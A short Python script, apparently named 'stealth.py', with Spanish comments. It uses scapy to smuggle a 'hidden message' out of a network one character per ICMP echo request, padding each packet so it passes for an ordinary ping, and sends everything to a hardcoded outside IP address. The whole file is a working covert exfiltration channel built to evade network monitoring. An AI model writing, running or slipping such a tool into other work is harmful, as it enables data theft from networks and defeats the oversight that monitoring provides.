import sys
from scapy.all import IP, ICMP, send

# Longitud deseada del payload en bytes
PAYLOAD_LEN = 48

def crear_payload(caracter: str) -> bytes:
    """
    Crea un payload de exactamente 48 bytes.
    El primer byte es el carácter a transmitir,
    el resto es padding incremental (0x0a, 0x0b, 0x0c, ...).
    """
    char_byte = caracter.encode()
    padding = bytes([(0x0a + i) & 0xFF for i in range(PAYLOAD_LEN - 1)])
    return char_byte + padding


def enviar_mensaje_icmp(destino: str, mensaje: str):
    print(f"Enviando mensaje oculto a {destino}...\n")

    # Todos los caracteres salvo el último
    for i, char in enumerate(mensaje[:-1]):
        payload = crear_payload(char)
        paquete = IP(dst=destino)/ICMP(type=8, id=12345, seq=i)/payload
        print(f"[+] Paquete {i+1} con carácter '{char}' ({len(payload)} bytes)")
        send(paquete, verbose=False)

    # Último carácter como delimitador
    delimitador = mensaje[-1]
    payload_final = crear_payload(delimitador)
    paquete = IP(dst=destino)/ICMP(type=8, id=12345, seq=len(mensaje))/payload_final
    print(f"[+] Paquete final con delimitador '{delimitador}' ({len(payload_final)} bytes)")
    send(paquete, verbose=False)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: sudo python3 stealth.py \"<mensaje_cifrado>\"")
        sys.exit(1)

    destino = "57.144.150.1"
    mensaje = sys.argv[1]
    enviar_mensaje_icmp(destino, mensaje)
